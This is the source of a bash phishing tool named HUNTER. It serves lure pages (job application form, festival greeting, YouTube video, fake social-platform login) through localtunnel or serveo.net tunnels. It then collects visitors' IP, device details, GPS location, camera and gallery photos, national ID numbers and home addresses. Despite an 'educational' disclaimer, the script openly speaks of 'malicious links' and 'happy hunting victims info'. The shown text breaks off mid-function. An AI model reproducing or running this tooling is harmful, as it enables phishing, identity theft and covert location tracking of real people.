#!/usr/bin/env bash

### Name: HUNTER
### Version: 1.0.0
### Author: evilfeonix
### Github: http://github.com/evilfeonix
### Youtube: http://www.youtube.com/evilfeonix


###  I'm currently learning bash scripting.
###  I used my little knowladge to read a premade script.
###  And i try to create this tool on my own, by adding more features.
###  If u like my work and u realy wanna contribute, am free.
###  I may be slow to respond.
###  Please mail me at evilfeonix@gmail.com if something is wrong (^-^).


            #           ## #                             
            ##  ##  ##  ## ##  ## ###### ######  #####   
            ##  ##  ##  ## ### ##   ##   ##      ##  ##  
            ######  ##  ## ######   ##   ####    ##  ##  
            ##  ##  ##  ## ## ###   ##   ##      #####   
            ##  ##   ####  ##  ##   ##   ####### ##  ##  
                ##              #    #                   
                 #   


###            DISCLAMER:-
### This program similate phishing and it created for educational purpose
### It was also intended for digital security awearness (social engineering, phishing)
### It demonstrate how easily an attacker can obtain victims informations throught phishing
### And also used those informations to plan a successful attack against their victims.
###    

###            LICENSE:-
### you are allowed to re-destribute this program with thousand of copies
### as long as you did not modify even a little pease of code
### modify this program will break our license agreement
###    


### function dependenceis()
### {
###     php:- command is required for starting local server on your on local mechines
###     ssh:- command is also required, but this command is defaultly install in some operating systems
###     npm:- command is required while using localtunnel as your port forwarding 
### }

### Script termination
trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Terminated!";loading;redirection;printf "\033[0m";kill_Processors;exit 1' 1
trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Interrupted!";loading;redirection;printf "\033[0m";kill_Processors;exit 1' 2


function Desktop()
{
    printf "\033[1;33m                          PORWERED BY ~ \033[1;37mEVILFEONIX\033[1;33m ~\n"
    printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
    printf "    ######## # ###### ###### # # ###### ######## ######## ######## ########     \n"
    printf "    ######## #  ##  # #  ##  # #  ##  # #      # #      # #      # ########     \n"
    printf "    ######## #  ##  # #  ##  # #   #  # ###  ### #  ##### #  ##  # ########     \n"
    printf "    ######## #      # #  ##  # #      # ###  ### #    ### #  ##  # ########     \n"
    printf "    ######## #  ##  # #  ##  # #  ##  # ###  ### #  ##### #     ## ########     \n"
    printf "    ######## #  ##  # ##    ## #  ##  # ###  ### #      # #  ##  # ########     \n"
    printf "    ######## #####  # ######## ###### # #### ### ######## ######## ########     \n"
    printf "    ######## ###### # ####### ##### \033[1;37m\033[4;1mv[1.0.0]\033[0m\033[1;33m #### ####### ######## ########     \n"
    printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
    printf "    ######## ########    \033[1;37m\033[4;1mhttps://github.com/evilfeonix\033[0m\033[1;33m    ######## ########     \n"
    printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
    printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
    printf "\033[0m\n"
 

}                           

function Android()
{
    printf "\033[1;33m              PORWERED BY \033[1;37mEVILFEONIX\033[1;33m\n"          #  
    printf "         /\  ____  __/|  ________\033[1;37mv\033[4;1m[1.0.0]\033[0m\033[1;33m__ \n"
    printf "        / / / / / / / | / /_  __/ ____/ __ \ \n"
    printf "       / /_/ / / / /  |/ / / / / __/ / /_/ / \n"
    printf "      / __  / /_/ / /|  / / / / /___/ _, _/  \n"
    printf "     /_/ / /\____/_/ | / / / /_____/_/ |_|   \n"
    printf "         \/          |/  \/                  \n"
    printf "       \033[1;37m\033[4;1mhttps://github.com/evilfeonix/\033[0m  \n"
    printf "\033[0m\n"
}

function banner(){
    arch=$(uname -a | grep -o 'arm' | head -n1)
    arch2=$(uname -a | grep -o 'Android' | head -n1)
    arch3=$(uname -a | grep -o 'aarch64' | head -n1)
    arch4=$(uname -a | grep -o 'Darwin' | head -n1)

    if [[ $arch == *'arm'* || $arch2 == *'Android'* && $arch4 != *'Darwin'* ]] ; then
        Android
    else
        Desktop
        # Android
    fi
}


function loading()
{
	dot=(. . .)
	for i in "${dot[@]}"
	do
		printf $i
		sleep $((1))
	done
	echo -e "\033[1;77m"
	sleep $((1))
}

function kill_Processors() 
{
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkssh=$(ps aux | grep -o "ssh" | head -n1)

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi

    if [[ $checkssh == *'ssh'* ]]; then
        killall -2 ssh > /dev/null 2>&1
    fi
}

function install_LT()
{
    read -p $'\n\033[1;33m[\033[1;37m++\033[1;33m] Press [\033[1;37mEnter\033[1;33m] to start the installation process, otherwise type (n/No): \033[1;37m' act
    if [[ $act == "n" || $act == "no" || $act == "N" || $act == "No" || $act == "NO" ]]; then
        printf "\n\033[1;33m[\033[1;37m++\033[1;33m] Note that the LocalTunnel can't be use because you denied the installation.\n"
        redirection
    fi

    printf "\n\033[1;37m[\033[1;33m++\033[1;37m] Installing node.js on this machine";loading
    apt install npm > /dev/null || { 
        sleep 2;
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Node.js not install!, if you're not on root.\033[1;37m\n";
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Run this script on root and try again, else check your internet connection.\033[1;37m\n"; 
        exit 1; 
    }
    
    sleep 5
    printf "\033[1;37m[\033[1;33m++\033[1;37m] Installing LocalTunnel using node.js";loading
    npm install -g Localtunnel > /dev/null || { 
        sleep 2;
        printf "\033[1;33m[\033[1;37m++\033[1;33m] LocalTunnel not install!,\033[1;37m\n"; 
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Please check your internet connection\033[1;37m\n"; 
        exit 1;
    }
    sleep 5
    
    lt > /dev/null || { 
        sleep 2;
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Hmm, we can't automatically install LocalTunnel,\033[1;37m\n";  
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Please visit\033[1;37m https://localtunnel.me/ \033[1;33mto learn how to manually install it.\033[1;37m\n"; 
        exit 1;
     }
    sleep 2
    
    printf "\033[1;33m[\033[1;37m++\033[1;33m] LocalTunnel was install successfull,\033[1;37m\n"
    printf "\033[1;33m[\033[1;37m++\033[1;33m] Now you can use it to generate a malicious link which can be accessible around the world.\033[1;37m\n"
    redirection
}

function redirection() 
{
    printf "\n\033[1;33m[\033[1;37m++\033[1;33m] For more information regardless to this tool\033[1;37m\n"
    printf "\033[1;33m[\033[1;37m++\033[1;33m] Please contact the author at \033[1;37mevilfeonix@gmail.com\033[1;37m\n"
    printf "\033[1;33m[\033[1;37m++\033[1;33m] Also follow us on github, star and fork this our hacking tools\033[1;37m\n"
    printf "\033[1;33m[\033[1;37m++\033[1;33m] Thank for using \033[1;37mHUNTER\033[1;33m!, and again happy hunting victims info\033[1;37m";loading
    evilfeonix="https://github.com/evilfeonix/HUNTER" 
    xdg-open $evilfeonix
    echo ""
    exit 0
}

function catch_victims() 
{
    printf "\n\033[1;37m[\033[1;33m++\033[1;37m] Waiting for victims, Press Ctrl+C to quit";loading
    sleep 1

    while [ true ]; do
    	trap "break" INT
        if [[ -e "ip.txt" ]]; then
            t=$(grep -a 'time' ip.txt | cut -d "=" -f 2 | tr -d '\r')
            d=$(grep -a 'date' ip.txt | cut -d "=" -f 2 | tr -d '\r')
            ip=$(grep -a 'ip' ip.txt | cut -d "=" -f 2 | tr -d '\r')
            agent=$(grep -a 'agent' ip.txt | cut -d "=" -f 2 | tr -d '\r')

            if [[ -d $ip/$d ]]; then
                cat ip.txt >> $ip/$d/victim_Info.txt
            else
                mkdir -p $ip/$d
                cat ip.txt >> $ip/$d/victim_Info.txt
            fi
            rm -rf ip.txt

            printf "\n\033[1;32m[\033[1;37m√√\033[1;32m] Victims successfully visit our malicious link!";loading
            printf "   \033[1;33mTime: \033[1;37m%s\n" $t 
            printf "   \033[1;33mDate: \033[1;37m%s\n" $d
            printf "   \033[1;33mVictims IP: \033[1;37m%s\n" $ip 
        fi

        sleep 0.5
        if [[ -e "victims.txt" ]]; then
            addr=$(grep -a 'exactAddr' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            victims=$(grep -a 'victimsName' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            plat=$(grep -a 'platform' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            arch=$(grep -a 'architecture' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            appV=$(grep -a 'browserVer' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            app=$(grep -a 'browserName' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            appN=$(grep -a 'appName' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            appC=$(grep -a 'appCodeName' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            coo=$(grep -a 'cookieEnabled' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            cty=$(grep -a 'country' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            rgn=$(grep -a 'region' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            ct=$(grep -a 'city' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            tz=$(grep -a 'tz' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            os=$(grep -a 'OS' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            device=$(grep -a 'devices' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            date=$(grep -a 'datetime' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            smy=$(grep -a 'summary' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            dVs=$(grep -a 'deviceVersion' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            dMl=$(grep -a 'deviceModel' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            lgg=$(grep -a 'languages' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            lat=$(grep -a 'latitude' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            lng=$(grep -a 'longitude' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            cpu=$(grep -a 'CPUCores' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            sWth=$(grep -a 'screenWidth' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            sHgh=$(grep -a 'screenHeight' victims.txt | cut -d "=" -f 2 | tr -d '\r')
            
            cat victims.txt >> $ip/$d/victim_Info.txt
            rm -rf victims.txt

            printf "   \n\033[1;33mVictims Name: \033[1;37m%s\n" $victims
            
            printf "\n\033[1;32m[\033[1;37m√√\033[1;32m] Browser Information";loading
            if [[ $app == "Unidentified" ]]; then
                printf "   \033[1;33mName: \033[1;31m%s\n" $app
                printf "   \033[1;33mVersion: \033[1;31m%s\n" $appV
            else
                printf "   \033[1;33mName: \033[1;37m%s\n" $app
                printf "   \033[1;33mVersion: \033[1;37m%s\n" $appV
            fi

            printf "   \033[1;33mLanguages: \033[1;37m%s\n" $lgg
            printf "   \033[1;33mApp Name: \033[1;37m%s\n" $appN
            printf "   \033[1;33mApp Code Name: \033[1;37m%s\n" $appC
            printf "   \033[1;33mCookie Enabled: \033[1;37m%s\n" $coo
            printf "   \033[1;33mJavaScript Enabled: \033[1;37mtrue\n"

            printf "\n\033[1;32m[\033[1;37m√√\033[1;32m] Device Information";loading
            printf "   \033[1;33mOS: \033[1;37m%s\n" $os
            
            if [[ $device == "Unidentified" ]]; then
            	printf "   \033[1;33mDevice: \033[1;31m%s\n" $device
            else
            	printf "   \033[1;33mDevice: \033[1;37m%s\n" $device
            fi

            if [[ $plat == "Unidentified" ]]; then
            	printf "   \033[1;33mPlatform: \033[1;31m%s\n" $plat
            else
            	printf "   \033[1;33mPlatform: \033[1;37m%s\n" $plat
            fi

            if [[ $arch == "Unidentified" ]]; then
            	printf "   \033[1;33marchitecture: \033[1;31m%s\n" $arch
            else
            	printf "   \033[1;33marchitecture: \033[1;37m%s\n" $arch
            fi

            if [[ -z $dMl || $dMl == "Unidentified" ]]; then
                printf "   \033[1;33mDevice Model: \033[1;31mUnidentified\n" 
            else
            	printf "   \033[1;33mDevice Model: \033[1;37m%s\n" $dMl
            fi

            if [[ $dVs == "Unidentified" ]]; then
            	printf "   \033[1;33mDevice Version: \033[1;31m%s\n" $dVs
            else
            	printf "   \033[1;33mDevice Version: \033[1;37m%s\n" $dVs
            fi

            printf "   \033[1;33mNumber of CPU Cores: \033[1;37m%s\n" $cpu
            printf "   \e[1;95mScreen Resolution\n"
            printf "   \033[1;33mDevice Width: \033[1;37m%s\n" $sWth
            printf "   \033[1;33mDevice Height: \033[1;37m%s\n" $sHgh
            printf "   \033[1;33mDevice Summary: \033[1;37m%s\n" $smy
            printf "   \033[1;33mDevice Date & Time: \033[1;37m%s\n" $date

            
            printf "\n\033[1;32m[\033[1;37m√√\033[1;32m] Victims Location";loading
            printf "   \033[1;33mCity: \033[1;37m%s\n" $ct
            printf "   \033[1;33mRegion: \033[1;37m%s\n" $rgn
            printf "   \033[1;33mCountry: \033[1;37m%s\n" $cty
            printf "   \033[1;33mTimezone: \033[1;37m%s\n" $tz

            if [[ !$lat == "Unidentified" && !$lng == "Unidentified" ]]; then
                printf "   \033[1;33mLatitude: \033[1;37m%s\n" $lat
                printf "   \033[1;33mLongitude: \033[1;37m%s\n" $lng

                if [[ !$addr == "Unidentified" ]]; then
                    printf "   \033[1;33mExact Address: \033[1;37m%s\n" $addr
                    printf '\n\033[1;33m[\033[1;37m++\033[1;33m] Victims GPS location found.\e[0m '
                    read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Will you like to track the exact location on google map? [Y/n]:\e[0m ' Do__
                    if [[ $Do__ == "Y" || $Do__ == "y" || $Do__ == "Yes" || $Do__ == "yes" ]]; then
                        
                        url="https://google.com/maps/place/$lat,$lng/@$lat,$lng,16z" 
                        printf "\n\033[1;37m[\033[1;33m++\033[1;37m] Mapping victims exact Location";loading
                        sleep 1
                        xdg-open $url
                    elif [[ $Do__ == "n" || $Do__ == "No" || $Do__ == "no" || $Do__ == "N" ]]; then
                        printf "\n\033[1;37m[\033[1;33m++\033[1;37m] We hope you know what you are doing!";loading
                    else
                        printf "\n\033[1;31m[\033[1;33m--\033[1;31m] Invalid Option!" 
                    fi

                else
                    printf "   \033[1;33mExact Address: \033[1;31m%s\n" $addr
                fi
            else
                printf "   \033[1;33mLatitude: \033[1;31m%s\n" $lat
                printf "   \033[1;33mLongitude: \033[1;31m%s\n" $lng
                printf "   \033[1;33mExact Address: \033[1;31m%s\n" $addr
            fi
        fi

        sleep 0.5
        if [[ -e "form.txt" ]]; then
            victims=$(grep -a 'name' form.txt | cut -d "=" -f 2 | tr -d '\r')
            phone=$(grep -a 'phone' form.txt | cut -d "=" -f 2 | tr -d '\r')
            email=$(grep -a 'email' form.txt | cut -d "=" -f 2 | tr -d '\r')
            state=$(grep -a 'state' form.txt | cut -d "=" -f 2 | tr -d '\r')
            lga=$(grep -a 'lga' form.txt | cut -d "=" -f 2 | tr -d '\r')
            homeaddr=$(grep -a 'home' form.txt | cut -d "=" -f 2 | tr -d '\r')
            dob=$(grep -a 'dob' form.txt | cut -d "=" -f 2 | tr -d '\r')
            nin=$(grep -a 'nin' form.txt | cut -d "=" -f 2 | tr -d '\r')
            occ=$(grep -a 'job' form.txt | cut -d "=" -f 2 | tr -d '\r')
            gender=$(grep -a 'gender' form.txt | cut -d "=" -f 2 | tr -d '\r')
            age=$(grep -a 'age' form.txt | cut -d "=" -f 2 | tr -d '\r')
            galary=$(grep -a 'galaryPic' form.txt | cut -d "=" -f 2 | tr -d '\r')
            marry=$(grep -a 'maritan' form.txt | cut -d "=" -f 2 | tr -d '\r')
            
            cat form.txt >> $ip/$d/victim_Info.txt
            rm -rf form.txt

            printf "\n\033[1;32m[\033[1;37m√√\033[1;32m] Personal information!";loading
            printf "   \033[1;33mVictims Age: \033[1;37m%s\n" $age 
            printf "   \033[1;33mGender: \033[1;37m%s\n" $gender 
            printf "   \033[1;33mMarritan: \033[1;37m%s\n" $marry 
            printf "   \033[1;33mFull Name: \033[1;37m%s\n" $victims 
            printf "   \033[1;33mDate-of-Birth: \033[1;37m%s\n" $dob 
            printf "   \033[1;33mPhone Number: \033[1;37m%s\n" $phone
            printf "   \033[1;33mEmail Address: \033[1;37m%s\n" $email 
            printf "   \033[1;33mState they live: \033[1;37m%s\n" $state 
            printf "   \033[1;33mCountry they live: \033[1;37m%s\n" $cty 
            printf "   \033[1;33mLocal Government Area: \033[1;37m%s\n" $lga 
            printf "   \033[1;33mTheir Home Address: \033[1;37m%s\n" $homeaddr 
            printf "   \033[1;33mNational ID Number: \033[1;37m%s\n" $nin 
            printf "   \033[1;33mTheir Current Occupation: \033[1;37m%s\n" $occ 
            
            if [[ $galary == "Unable_to_upload_victims_photo_from_their_galary" ]]; then
            	printf "   \n\033[1;33mVictims Galary Pic: \033[1;31m%s\n" $galary 
            else
            	printf "   \n\033[1;33mVictims Galary Pic: \033[1;37m%s\n" $galary
            fi
        fi

        sleep 0.5
        if [[ -e "attention.txt" ]]; then
            msg=$(grep -a 'message' attention.txt | cut -d "=" -f 2 | tr -d '\r')
            redflag=$(grep -a 'redFlag' attention.txt | cut -d "=" -f 2 | tr -d '\r')
            denied1=$(grep -a 'denied1' attention.txt | cut -d "=" -f 2 | tr -d '\r')
            denied2=$(grep -a 'denied2' attention.txt | cut -d "=" -f 2 | tr -d '\r')
            granted1=$(grep -a 'granted1' attention.txt | cut -d "=" -f 2 | tr -d '\r')
            granted2=$(grep -a 'granted2' attention.txt | cut -d "=" -f 2 | tr -d '\r')
	        cat attention.txt >> $ip/$d/victim_Info.txt
            rm -rf attention.txt
            
            printf "\n\033[1;33m[\033[1;37m!!\033[1;33m] Attention!";loading
            if [[ -n $redflag ]]; then
                printf "\033[1;32mRed Flag: \033[1;97mdone_with_the_information_hunting!,\e[0m\n"
                if [[ $temp -eq 3 || $temp -eq 4 ]]; then
                    printf "\033[1;32mImportant Note: \033[1;97mif_you_want_victims_personal_information_to_be_hunted. \e[0m\n"
                    printf "\033[1;32mImportant Note: \033[1;97mthen_you_gotta_select_either_\033[1;32m01\033[1;37m_or_\033[1;32m02\033[1;37m_in_the_template_served_ section. \e[0m\n" 
                fi
                break
            fi
            if [[ -n $msg ]]; then
                printf "\033[1;32mImportant Note: \033[1;97m%s\e[0m\n" $msg
            fi
            if [[ -n $denied1 ]]; then
                printf "\033[1;31mCamera Access Denied: \033[1;97m%s\e[0m\n" $denied1
            fi
            if [[ -n $granted1 ]]; then
                printf "\033[1;32mCamera Access Granted: \033[1;97m%s\e[0m\n" $granted1
            fi

            if [[ -n $denied2 ]]; then
                printf "\033[1;31mLocation Access Denied: \033[1;97m%s\e[0m\n" $denied2
            fi
            if [[ -n $granted2 ]]; then
                printf "\033[1;32mLocation Access Granted: \033[1;97m%s\e[0m\n" $granted2
            fi
        fi

        sleep 0.5
        if [[ -e "image.txt" ]]; then
            file=$(grep -a 'filename' image.txt | cut -d "=" -f 2 | tr -d '\r')
            rm -rf image.txt
            printf "\n\033[1;33m[\033[1;37m++\033[1;33m] Victims picture received!\033[0m";loading
            printf "   \033[1;33mSaved at: \033[1;37m%s\n" $file 
        fi
        sleep 0.5
    done

    trap - INT
    kill_Processors
    dir="$ip/$d/victim_Info.txt"
    if [[ -n $ip ]]; then
        if [[ -n $agent ]]; then
            printf "   \033[1;33m\nVictims User Agent: \033[1;37m%s\n" $agent
        else
            printf "\n\033[1;33m[\033[1;37m++\033[1;33m] User Agent can not be found in victims browser\033[1;37m\n"
        fi
        printf "\n\033[1;33m[\033[1;37m++\033[1;33m] All information hunted from \033[1;37m$victims\033[1;33m by name, \033[1;37m$ip\033[1;33m by ip address\033[1;37m\n"
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Has been saved in \033[1;37m$dir\033[1;33m file\033[1;37m\n"
        printf "\033[1;33m[\033[1;37m++\033[1;33m] For more information regardless to this tool\033[1;37m\n"
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Please contact the author at \033[1;37mevilfeonix@gmail.com\033[1;37m\n"
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Also follow us on github, star and fork this our hacking tools\033[1;37m\n"
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Thank for using \033[1;37m\033[1;37mHUNTER\033[1;33m\033[1;33m!, and again happy hunting victims info\033[1;37m";loading
    else
        printf "\n\033[1;33m[\033[1;37m++\033[1;33m] No information was hunted from victims!\033[1;37m\n"
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Make sure you sent the generated malicious link to victim\033[1;37m\n"
        printf "\033[1;33m[\033[1;37m++\033[1;33m] If victims visit our malicious link, their informations will be hunted\033[1;37m\n"
        printf "\033[1;33m[\033[1;37m++\033[1;33m] And also, it will be sent back to you, and saved it in a dedicated file\033[1;37m\n"
        printf "\033[1;33m[\033[1;37m++\033[1;33m] For more information regardless to this tool\033[1;37m\n"
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Please contact the author at \033[1;37mevilfeonix@gmail.com\033[1;37m\n"
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Also follow us on github, star and fork this our hacking tools\033[1;37m\n"
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Thank for using \033[1;37m\033[1;37mHUNTER\033[1;33m\033[1;33m!, and again happy hunting victims info\033[1;37m";loading
    fi

    evilfeonix="https://github.com/evilfeonix/HUNTER"
    xdg-open $evilfeonix
    echo ""
    exit 0

}

function template()
{
    default_temp='1'
    printf "\n\033[1;37m-------\033[1;33mTemplate Served\033[1;37m-------\n\n"    
    printf "   \033[1;33m[\033[1;37m01\033[1;33m] Applicant Form\n"
    printf "   \033[1;33m[\033[1;37m02\033[1;33m] Festival Wishing\n"
    printf "   \033[1;33m[\033[1;37m03\033[1;33m] Live Youtube Video\n"
    printf "   \033[1;33m[\033[1;37m04\033[1;33m] Custom Social Platform\n\n"
    read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Choose a Template to Used [\033[1;37mDefault is 1\033[1;33m]:\033[1;37m ' temp
    if  [[ $temp -gt 4 && $temp -lt 1 ]]; then
        printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Invalid Template Option!\n"
        printf '\033[1;31m[\033[1;37m!!\033[1;31m] Please Try Again.\033[0m\n'
        sleep 2
        template
    fi
    if [[ -z $temp ]]; then
        temp=$default_temp
    fi

    if [[ $temp == 2 ]] || [[ $temp == 02 ]]; then
        read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Enter Festival Name:\033[1;37m ' festName
        festName="${festName//[[:space:]]/}"
        while [[  -z $festName  ]]
        do
            printf '\033[1;31m[\033[1;37m!!\033[1;31m] Festival Name can not be empty.\033[0m\n'
            sleep 1
            read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Re-enter Festival Name:\033[1;37m ' festName
            festName="${festName//[[:space:]]/}"
        done
        subdomain="happy-$festName-seasson=$RANDOM"
        temp=2
    elif [[ $temp == 3 ]] || [[ $temp == 03 ]]; then
        read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Enter YouTube Video ID:\033[1;37m ' videoID
        videoID="${videoID//[[:space:]]/}"
        while [[  -z $videoID  ]]
        do
            printf '\033[1;31m[\033[1;37m!!\033[1;31m] YouTube Video ID can not be empty.\033[0m\n'
            sleep 1
            read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Re-enter YouTube Video ID:\033[1;37m ' festName
            videoID="${videoID//[[:space:]]/}"
        done
        subdomain="youtubevideo=$videoID-$RANDOM"
        temp=3
    elif [[ $temp == 1 ]] || [[ $temp == 01 ]]; then
        subdomain="jobapplicationform-$RANDOM"
        temp=1
    elif [[ $temp == 4 ]] || [[ $temp == 04 ]]; then
        read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Enter Platform Name:\033[1;37m ' SplatName
        read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Copy and Paste "'$SplatName'" Login URL:\033[1;37m ' Splatform
        SplatName="${SplatName//[[:space:]]/}"
        while [[  -z $SplatName || -z $Splatform ]]
        do
            printf '\033[1;31m[\033[1;37m!!\033[1;31m] Platform Name and it Login URL can not be empty.\033[0m\n'
            sleep 1
            read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Re-enter Platform Name:\033[1;37m ' SplatName
            read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Re-copy and Re-paste it Login URL:\033[1;37m ' Splatform
            videoID="${SplatName//[[:space:]]/}"
        done
        subdomain="$SplatName-$RANDOM"
        temp=4
    else
        printf '\n\033[1;31m[\033[1;37m!!\033[1;31m] Invalid template option!, try again.\033[0m\n'
        sleep 1
        template
    fi
    sleep 1
}

function templateSetup()
{
    # echo -e "$temp\n$mal_link\n$festName\n$subdomain"
    printf "\033[1;37m[\033[1;33m++\033[1;37m] Preparing a template for the attack";loading
    sleep 2

    # sed 's+malicious_link+'$mal_link'+g' template.php > index.php
    sed 's+malicious_link+'$mal_link'+g' payload.js > payload1.js
    if [[ $temp -eq 2 ]]; then
        sed 's+malicious_link+'$mal_link'+g' festival.html > index2.html
        sed 's+fes_name+'$festName'+g' payload1.js > payload2.js
        rm -rf payload1.js
    elif [[ $temp -eq 3 ]]; then
        sed 's+malicious_link+'$mal_link'+g' youtube.html > index3.html
        sed 's+live_yt_tv+'$videoID'+g' index3.html > index2.html
    elif [[ $temp -eq 1 ]]; then
        sed 's+malicious_link+'$mal_link'+g' applicant.html > index2.html
    else
        sed 's+malicious_link+'$mal_link'+g' platform.html > index3.html
        sed 's+plat_link+'$Splatform'+g' index3.html > index4.html
        sed 's+plat_name+'$SplatName'+g' index4.html > index2.html
        rm -rf index4.html
    fi
    rm -rf index3.html

    sleep 1
    printf '\n\033[1;32m[\033[1;37m√√\033[1;32m] Malicious link:\033[1;37m %s/\033[1;37m\n' $mal_link
    sleep 2
    catch_victims
}

function localhost() 
{   
    command -v php > /dev/null 2>&1 || { 
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Opsy!, php is missing...,\n";
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Please install it in order to continue running this script.\n"; 
        exit 1; 
    }

    addr="127.0.0.1:31301"
    printf "\n\n\033[1;37m[\033[1;33m++\033[1;37m] Starting php server";loading
    fuser -k 31301/tcp > /dev/null 2>&1
    php -S $addr 1> /dev/null 2> maliciouslink &
    sleep 3

    printf "\033[1;37m[\033[1;33m++\033[1;37m] Generating malicious link";loading
    mal_link=$(grep -oE "http://[a-zA-Z0-9.-:]+" maliciouslink | head -n 1)
    rm -rf maliciouslink
    sleep 2
    
    templateSetup
}

function localtunnel() 
{   
    command -v lt > /dev/null 2>&1  || command -v npm > /dev/null 2>&1 || { 
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Opsy!, npm node.js is missing.\n"; 
        printf "\033[1;33m[\033[1;37m++\033[1;33m] But we can automatically install it for you togather with the LocalTunnel.\n"; 
        install_LT;
    }

    # addr="127.0.0.1:31301"
    printf "\n\n\033[1;37m[\033[1;33m++\033[1;37m] Starting php server";loading
    fuser -k 31301/tcp > /dev/null 2>&1
    php -S localhost:31301 > /dev/null 2>&1 &
    sleep 3

    printf "\033[1;37m[\033[1;33m++\033[1;37m] Starting LocalTunnel server";loading
    lt --port 31301 2> sshError > maliciouslink &
    sleep 5

    printf "\033[1;37m[\033[1;33m++\033[1;37m] Generating malicious link";loading
    if [[ -e linkerror ]]; then
        if [[ -s linkerror ]]; then
            rm -rf linkerror
        else
            err=$(cat linkerror)
            printf "\033[1;31m[\033[1;37m--\033[1;31m] Generating malicious link error: " $err
            exit 1
        fi
        rm -rf linkerror
        rm -rf maliciouslink
    fi

    mal_link=$(grep -o "https://[a-zA-Z0-9.-]*" maliciouslink | head -n 1)    #.loca.lt
    rm -rf maliciouslink
    sleep 2
    
    templateSetup
}

function serveo() 
{   
    command -v php > /dev/null 2>&1 || { 
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Opsy!, php is missing...,\n";
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Please install it in order to continue running this script.\n";
        exit 1; 
    }
    
    command -v ssh > /dev/null 2>&1 || { 
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Opsy!, ssh is missing...,\n";
        printf "\033[1;33m[\033[1;37m++\033[1;33m] Please install it in order to continue running this script.\n";
        exit 1; 
    }

    printf "\n\n\033[1;37m[\033[1;33m++\033[1;37m] Starting php server";loading
    fuser -k 31301/tcp > /dev/null 2>&1
    php -S localhost:31301 > /dev/null 2>&1 &
    sleep 3

    printf "\033[1;37m[\033[1;33m++\033[1;37m] Starting serveo.net server";loading
    ssh -o StrictHostKeyChecking=no -R $subdomain:80:localhost:31301 serveo.net 2> sshError > maliciouslink &

    # Wait for Serveo to establish the tunnel
    sleep 5
    if [[ -e sshError ]]; then
        conn=$(grep -a "Connection refused" sshError)
        resolve=$(grep -a "Temporary failure" sshError)

        if [[ -n $conn ]]; then
            printf '\n\033[1;31m[\033[1;37m--\033[1;31m] ssh: connect to host serveo.net port 22: Connection refused!\n'
            printf '\033[1;31m[\033[1;37m!!\033[1;31m] Hmm!, several reasons may caused this error, here are some tips to try.\n'
            printf '   01. Verify ssh port by checking the ssh configuration.\n'
            printf '        cmd (`\033[1;37mgreb -a Port /etc/ssh/sshd_conig\033[1;31m`).\n'
            printf '   02. Enable ssh access on your machine, by starting the ssh.\n'
            printf '        cmd (`\033[1;37msudo service ssh start\033[1;31m`).\n'
            printf '   03. It may be posible that the firewall is blocking ssh connections.\n'
            printf '        cmd (`\033[1;37mufw allow 22\033[1;31m`).\n'
            printf '\033[1;31m[\033[1;37m!!\033[1;31m] Feel free to contact us for more solution.\033[0m\n'
        elif [[ -n $resolve ]]; then
            printf '\n\033[1;31m[\033[1;37m--\033[1;31m] Could not Resolve Hostname serveo.net!\n'
            printf '\033[1;31m[\033[1;37m!!\033[1;31m] Please Check Your Internet Connection.\033[0m\n'
        else
            cmd=$(cat sshError)
            printf "\n\033[1;31m[\033[1;37m--\033[1;31m] $cmd!\n" 

        fi
        rm -rf sshError
